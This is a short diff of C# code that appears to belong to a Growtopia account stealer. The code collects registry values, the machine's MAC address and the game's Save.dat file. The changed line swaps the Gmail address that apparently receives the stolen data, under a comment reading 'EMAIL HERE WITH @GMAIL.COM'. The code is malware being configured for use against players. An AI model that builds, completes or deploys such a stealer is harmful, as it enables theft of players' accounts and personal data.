@@ -54,7 +54,7 @@ internal sealed class Module1
             string regfolder = "Software"; //TYPE THE FOLDER NAME HERE FROM HKCU
             string regfile1 = "Growtopia"; //TYPE ONE OF THE FILE NAMES HERE FROM THAT FOLDER
             string regfile2 = "Activate Setup"; //TYPE ONE SECOND FILE NAME HERE
-            string text = "taaffyou@gmail.com"; //EMAIL HERE WITH @GMAIL.COM
+            string text = "ardalg689@gmail.com"; //EMAIL HERE WITH @GMAIL.COM
             string password = "";  //pas
             string regkeys = Regdata(hkcu[2], hkcu[4], "a", "b", "c", "d", cryptography, "xd", regfolder, regfile1, regfile2, "xd", "xd", "xd", "xd", macaddress);
             string str = "\\Growtopia\\Save.dat";
